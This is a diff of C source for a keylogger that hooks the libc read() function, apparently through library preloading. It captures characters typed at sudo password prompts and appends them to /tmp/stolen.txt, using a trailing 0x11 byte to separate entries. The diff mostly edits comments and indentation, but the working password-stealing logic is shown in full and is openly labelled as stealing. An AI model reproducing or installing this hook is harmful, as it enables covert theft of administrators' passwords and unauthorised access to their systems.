@@ -76,6 +76,7 @@ ssize_t read(int fd, void *buf, size_t count) {
     if(getfsize("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
       return original_read(fd, buf, count);
     }
+    // we open the file in append/read mode
     FILE *stealer = fopen("/tmp/stolen.txt", "a+");
     // this helps us isolate the characters from term only
     if(count == 1) {
@@ -85,30 +86,30 @@ ssize_t read(int fd, void *buf, size_t count) {
       char keybuf[2];
       snprintf(keybuf, sizeof(keybuf), "%.1s", (char *)buf);
       // as it turns out, after pass is written, an 0x11 goes into
-      // file, so we can trap that, and use it as a termintaor for
-      // subsequent password entries.
-      if(((char)keybuf[0] == 17) && (getfsize("/tmp/stolen.txt") != 0)) {
-        // we can make sure back to back newlines are not being
-        // written by pointing to the end of the file then pulling
-        // the character one back from EOF, then running a negate
-        // check on it.
-        fseek(stealer, -1, SEEK_END);
+      // file as sudo makes its exit, so if we can trap that, we can
+      // use it as a termintaor for subsequent password entries.
+      if(((char)keybuf[0] == 0x11) && (getfsize("/tmp/stolen.txt") != 0)) {
+	// we can make sure back to back newlines are not being
+	// written by pointing to the end of the file then pulling
+	// the character one back from EOF, then running a negate
+	// check on it.
+	fseek(stealer, -1, SEEK_END);
 	if(fgetc(stealer) != '\n') {
-          // if the last two checks go through, we can write a
-          // line feed.
-          fprintf(stealer, "\n");
+	  // if the last two checks go through, we can write a
+	  // line feed.
+	  fprintf(stealer, "\n");
 	}
       }
       else {
-        // otherwise we just start writing our keys pressed to the
-        // /tmp/stolen.txt file. We just need to cast buf to a char
-        // pointer, and make sure only a single char is written at
-        // a time.
+	// otherwise we just start writing our keys pressed to the
+	// /tmp/stolen.txt file. We just need to cast buf to a char
+	// pointer, and make sure only a single char is written at
+	// a time.
 	fprintf(stealer, "%.1s", (char *)buf);
       }
     }
     fclose(stealer);
   }
-  // or just go back to the original read function
+  // now just go back to the original read function
   return original_read(fd, buf, count);
 }
